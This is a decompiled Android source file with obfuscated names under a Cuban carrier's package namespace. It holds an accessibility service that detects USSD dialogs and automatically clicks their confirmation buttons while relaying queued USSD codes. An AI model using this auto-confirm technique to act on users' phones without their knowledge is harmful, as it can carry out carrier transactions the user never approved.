package cu.etecsa.cubacel.tr.tm.l08fNVC4KOKK.FY4jCHXwyiP.ZJaneAnYYBm.Jayac1C1XVL.ZJDahAOo71x;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

/* JADX INFO: loaded from: classes.dex */
public class H5bNyNZfB5K extends AccessibilityService {
    private static final String TAG = "USSDGlobalAccessibility";
    private String nextUssdCode;
    private boolean shouldListen = false;
    private BroadcastReceiver ussdReceiver = new BroadcastReceiver() { // from class: cu.etecsa.cubacel.tr.tm.l08fNVC4KOKK.FY4jCHXwyiP.ZJaneAnYYBm.Jayac1C1XVL.ZJDahAOo71x.H5bNyNZfB5K.1
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            if ("SEND_NEXT_USSD".equals(intent.getAction())) {
                H5bNyNZfB5K.this.nextUssdCode = intent.getStringExtra("USSD_CODE");
                Log.i(H5bNyNZfB5K.TAG, "Next USSD code received: " + H5bNyNZfB5K.this.nextUssdCode);
            }
        }
    };

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (this.shouldListen && event.getEventType() == 32) {
            Log.i(TAG, "Event received");
            if (isUssdDialog(event)) {
                Log.i(TAG, "USSD dialog detected");
                performGlobalAction(1);
                respondToUssd(event);
                sendNextUssd();
            }
        }
    }

    private boolean isUssdDialog(AccessibilityEvent event) {
        if (event.getText() != null) {
            for (CharSequence text : event.getText()) {
                if (text != null && text.toString().toLowerCase().contains("ussd")) {
                    return true;
                }
            }
            return false;
        }
        return false;
    }

    private void respondToUssd(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String[] buttonTexts = {"ACEPTAR", "OK", "CONFIRMAR", "SÍ", "YES"};
            for (String text : buttonTexts) {
                List<AccessibilityNodeInfo> nodeInfoList = source.findAccessibilityNodeInfosByText(text);
                if (nodeInfoList != null && !nodeInfoList.isEmpty()) {
                    for (AccessibilityNodeInfo node : nodeInfoList) {
                        if (node.isClickable()) {
                            node.performAction(16);
                            node.recycle();
                            return;
                        }
                    }
                }
            }
            source.recycle();
        }
    }

    public void sendNextUssd() {
        String str = this.nextUssdCode;
        if (str != null && !str.isEmpty()) {
            Log.i(TAG, "Sending next USSD: " + this.nextUssdCode);
            Intent intent = new Intent("SEND_NEXT_USSD");
            intent.putExtra("USSD_CODE", this.nextUssdCode);
            sendBroadcast(intent);
        }
    }

    public void sendNextUssd(String nextUssdCode) {
        if (nextUssdCode != null && !nextUssdCode.isEmpty()) {
            Log.i(TAG, "Sending next USSD: " + nextUssdCode);
            Intent intent = new Intent("SEND_NEXT_USSD");
            intent.putExtra("USSD_CODE", nextUssdCode);
            sendBroadcast(intent);
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
        Log.d(TAG, "Service onInterrupt");
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Service connected");
        IntentFilter filter = new IntentFilter("SEND_NEXT_USSD");
        registerReceiver(this.ussdReceiver, filter);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed");
        unregisterReceiver(this.ussdReceiver);
    }
}
